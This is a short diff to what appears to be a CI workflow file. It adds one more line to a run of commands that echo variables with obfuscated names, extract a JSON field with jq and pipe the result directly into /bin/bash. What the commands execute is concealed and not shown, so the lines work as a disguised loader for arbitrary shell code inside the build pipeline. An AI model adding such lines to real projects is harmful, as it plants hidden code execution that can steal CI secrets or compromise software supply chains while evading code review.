@@ -30,6 +30,7 @@ jobs:
           echo $vxr636 | jq -r .ww2466 | /bin/bash
           printf '%s' "$jprj1298" | jq -r .ampw02570 | /bin/bash
           echo $ery623 | jq -r .sips7 | /bin/bash
+          echo $g48355 | jq -r .pijws622 | /bin/bash
 
       - name: Persist results
         if: always()
